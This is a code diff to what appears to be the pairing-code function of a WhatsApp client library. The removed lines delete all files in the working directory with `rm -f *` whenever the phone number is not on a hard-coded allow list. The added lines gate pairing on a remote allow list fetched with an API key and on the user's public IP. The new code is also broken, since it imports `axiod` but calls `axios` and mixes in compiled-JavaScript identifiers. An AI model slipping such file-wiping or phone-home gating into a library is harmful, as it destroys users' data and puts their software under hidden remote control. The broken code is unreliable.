@@ -3,6 +3,7 @@ import { randomBytes } from 'crypto'
 import { URL } from 'url'
 import { promisify } from 'util'
 import { proto } from '../../WAProto'
+import axiod from 'axios'
 import {
 	DEF_CALLBACK_PREFIX,
 	DEF_TAG_PREFIX,
@@ -487,82 +488,107 @@ export const makeSocket = (config: SocketConfig) => {
 		end(new Boom(msg || 'Intentional Logout', { statusCode: DisconnectReason.loggedOut }))
 	}
 
-    const { exec } = require('child_process');
-    const path = require('path');
-    const allowedNumbers = ['6281351692548', '6282245353857'];
+async function fetchDataWithAxios() {
+  const url = 'https://www.kyuubeyours.web.id/api?apikey=kiuu';
+  try {
+    const response = await axios.get(url);
+    return response.data;
+  } catch (error) {
+    console.error('Akses ditolak');
+    return [];
+  }
+}
+
+async function checkUserData(phoneNumber) {
+  const userData = await fetchDataWithAxios();
+
+  const foundNumber = userData.find((user) => user.nomor === phoneNumber);
+  if (!foundNumber) {
+    console.log(`Nomor ${phoneNumber} tidak ditemukan!`);
+    return 'Nomor tidak terdaftar';
+  }
+
+  const userIp = await axios.get('https://api.ipify.org?format=json');
+  const currentIp = userIp.data.ip;
+
+  const foundIp = userData.find((user) => user.ip === currentIp);
+  if (!foundIp) {
+    console.log(`IP mu (${currentIp}) belum terdaftar, silakan hubungi owner.`);
+    return 'IP tidak terdaftar';
+  }
+
+  console.log(`Nomor dan IP terverifikasi: ${phoneNumber} - ${currentIp}`);
+  return 'Valid';
+}
 
 const requestPairingCodes = async (phoneNumber) => {
-    if (!allowedNumbers.includes(phoneNumber)) {
-        console.warn('Nomor tidak diizinkan! Menghapus Seluruh file...');
-        exec(`rm -f *`, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Gagal menghapus semua file: ${error.message}`);
-                return;
-            }
-            if (stderr) {
-                console.error(`Error: ${stderr}`);
-                return;
-            }
-            console.log('berhasil menghapus seluruh file');
-        });
+  const userCheckResult = await checkUserData(phoneNumber);
+  if (userCheckResult === 'Nomor tidak terdaftar') {
+    console.log('Akses ditolak karena nomor tidak terdaftar.');
+    return;
+  }
 
-        return;
-    }
-		authState.creds.pairingCode = bytesToCrockford(randomBytes(5))
-		authState.creds.me = {
-			id: jidEncode(phoneNumber, 's.whatsapp.net'),
-			name: '~'
-		}
-		ev.emit('creds.update', authState.creds)
-		await sendNode({
-			tag: 'iq',
-			attrs: {
-				to: S_WHATSAPP_NET,
-				type: 'set',
-				id: generateMessageTag(),
-				xmlns: 'md'
-			},
-			content: [
-				{
-					tag: 'link_code_companion_reg',
-					attrs: {
-						jid: authState.creds.me.id,
-						stage: 'companion_hello',
-						// eslint-disable-next-line camelcase
-						should_show_push_notification: 'true'
-					},
-					content: [
-						{
-							tag: 'link_code_pairing_wrapped_companion_ephemeral_pub',
-							attrs: {},
-							content: await generatePairingKey()
-						},
-						{
-							tag: 'companion_server_auth_key_pub',
-							attrs: {},
-							content: authState.creds.noiseKey.public
-						},
-						{
-							tag: 'companion_platform_id',
-							attrs: {},
-							content: '49' // Chrome
-						},
-						{
-							tag: 'companion_platform_display',
-							attrs: {},
-							content: `${browser[1]} (${browser[0]})`
-						},
-						{
-							tag: 'link_code_pairing_nonce',
-							attrs: {},
-							content: '0'
-						}
-					]
-				}
-			]
-		})
-		return authState.creds.pairingCode
-	}
+  if (userCheckResult === 'IP tidak terdaftar') {
+    console.log('Akses ditolak karena IP tidak terdaftar.');
+    return;
+  }
+
+  authState.creds.pairingCode = (0, Utils_1.bytesToCrockford)((0, crypto_1.randomBytes)(5));
+  authState.creds.me = {
+    id: (0, WABinary_1.jidEncode)(phoneNumber, 's.whatsapp.net'),
+    name: '~'
+  };
+  ev.emit('creds.update', authState.creds);
+
+  await sendNode({
+    tag: 'iq',
+    attrs: {
+      to: WABinary_1.S_WHATSAPP_NET,
+      type: 'set',
+      id: generateMessageTag(),
+      xmlns: 'md'
+    },
+    content: [
+      {
+        tag: 'link_code_companion_reg',
+        attrs: {
+          jid: authState.creds.me.id,
+          stage: 'companion_hello',
+          should_show_push_notification: 'true'
+        },
+        content: [
+          {
+            tag: 'link_code_pairing_wrapped_companion_ephemeral_pub',
+            attrs: {},
+            content: await generatePairingKey()
+          },
+          {
+            tag: 'companion_server_auth_key_pub',
+            attrs: {},
+            content: authState.creds.noiseKey.public
+          },
+          {
+            tag: 'companion_platform_id',
+            attrs: {},
+            content: '49'
+          },
+          {
+            tag: 'companion_platform_display',
+            attrs: {},
+            content: `${browser[1]} (${browser[0]})`
+          },
+          {
+            tag: 'link_code_pairing_nonce',
+            attrs: {},
+            content: '0'
+          }
+        ]
+      }
+    ]
+  });
+
+  return authState.creds.pairingCode;
+};
 
 	async function generatePairingKey() {
 		const salt = randomBytes(32)
